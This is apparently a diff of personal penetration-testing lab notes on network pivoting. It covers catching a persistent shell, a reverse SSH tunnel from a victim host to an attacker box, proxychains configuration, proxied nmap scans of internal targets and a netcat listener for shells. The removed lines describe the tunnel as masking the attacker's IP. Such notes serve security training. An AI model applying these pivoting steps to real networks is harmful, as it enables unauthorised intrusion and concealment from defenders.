@@ -1,97 +1,27 @@
 https://docs.google.com/document/d/1JrZwgBWYPLqBC2X1TcaHTomDRcLvnaJJcHp34pDkkcA/edit?usp=sharing
 
-Get Persistence up
-Pivot (2 step process)
-Do a ping sweep
-Setup proxychains with ssh as a listener
+catch persistent shell	
 
-(ATTACKER) get that persistent shell
-netstat -natp 
+upgrade shell
 
+(ATK) after catching app 1
+open ssh for proxy
 
-Sudo systemctl status ssh.service
+(TERM 1) sudo systemctl status ssh.service (CHECK/CHANGE/CHECK)
 
+(TERM 1) sudo systemctl status ssh.service
 
-(VICTIM)
+(TERM 1) netstat natp | grep LISTEN (SHOULD SEE YOUR PORT AND ESTABLISHED)
 
-Storing data on each engagement
-Cat targets| xargs mkdir
-Ls
-(these next 2 parts i think you can skip if you already are on target)
-for i in 192.*;do echo $i > ./$i/scope; done (creates a scope file inside each directory with the IP address of that target inside of it already)
+(VIC 1) ssh -N -f -R 127.0.0.1:9080 kali@192.168.122.209 -p 55556 (MAKE SURE PORT FWD RULE IS GOOD ON PFSENSE SSH PORT 22)
 
-sudo nmap -iL scope -F -oN fast_scan (to scan a target you saved, first cd then ls the IP and then run the command) 
+(VIC 1) should be promted a pass
 
-(VICTIM) ssh -N -f -R 127.0.0.1:9080 kali@192.168.122.209 -p 55556
-(remember to upgrade your shell)
+(ATK) (TERM 1) netstat -natp | grep LISTEN (OUT OUTPUT SHOULD BE 9080 QUAD 0* LISTEN)
 
-(If you see this error it just means your proxy is already open, this is okay)
+(ATK)(TERM 2) LS > CD > DESKTOP > LS > CD PENTEST > CD INTERNAL (SHOULD SEE IP'S PING SWEEPS AND TARGETS) > LS 
 
-Start that “Pivot”
-Sudo proxychains nmap -iL scope -sT -Pn | tee fast_scan
+(ATK)(TERM 2) sudo proxychains nmap -iL scope -F Pn -sT (VERIFY ITS WORKING)
 
-
-
-
-(ATTACKER) validate your proxy with: netstat -natp “refrence below pic.”
-sudo nmap -iL scope -F -Pn -sT | tee fast_scan to see if it works
-
-After researching what port to attack and how. ( utulize google and other resources for research “HackTricks”)
-Open a new terminal .
-
-Pivoting
-
-Comment strictchain and uncomment dynamicchain. Uncomment quitemode. Comment proxydns. Then change the default config at the bottom from socks4 127.0.0.1 9080 to socks5 and whatever port you want to use.
-
-
-GitHub Guide: Configuring ProxyChains for Enhanced Anonymity
-Pre-requisites:
-Ensure xclip is installed for RDP functionality.
-On the Attacker Box:
-Edit ProxyChains Configuration
-If you haven't already configured ProxyChains, open the configuration file with:
-
-bash
-Copy code
-sudo nano /etc/proxychains4.conf
-Modify ProxyChains Configuration:
-Comment out strict_chain
-Uncomment dynamic_chain
-Uncomment quiet_mode
-Comment proxy_dns
-Change the Default Config from socks4 127.0.0.1 9080 to socks5 127.0.0.1 [YourPreferredPort] where [YourPreferredPort] is the port number you choose.
-Verify SSH Service Status and Start if Necessary
-
-Check if SSH service is running:
-lua
-Copy code
-sudo systemctl status ssh.service
-If the SSH service is not started, start it with:
-sql
-Copy code
-sudo systemctl start ssh.service
-Configure Port Forwarding Rule on pfSense
-This step is crucial for setting up a tunnel from the victim machine back to the attacker's machine.
-
-Establish SSH Tunnel from Victim Machine
-
-On the victim's machine, run:
-graphql
-Copy code
-ssh -N -f -R 127.0.0.1:9080 attacker_username@attacker_IP -p unique_pivot_port
-Note: This command will not produce output. Verify the connection by checking open ports on the attacker machine.
-Use ProxyChains to Route Traffic through the SSH Tunnel
-
-To perform an Nmap scan through the proxy, use:
-bash
-Copy code
-sudo proxychains nmap -iL scope -F -sT -Pn | tee fast_scan
-This step ensures that the scanning traffic is routed through the established SSH tunnel, leveraging the port forwarding rule for anonymity.
-
-Additional Notes:
-Ensure to refer to the wiki for screenshots and more detailed steps if necessary.
-The process involves setting up an SSH tunnel from the victim machine to the attacker's machine, thereby allowing the attacker to route traffic (such as Nmap scans) through the tunnel, effectively masking their true IP address.
-This guide provides a straightforward approach to configuring ProxyChains and setting up an SSH tunnel for secure and anonymous operations.
-
-
-python3 -m http.server 8000
+catch user persistence shell ON VIC2 [[14:02]]
+nc -lvp 55555
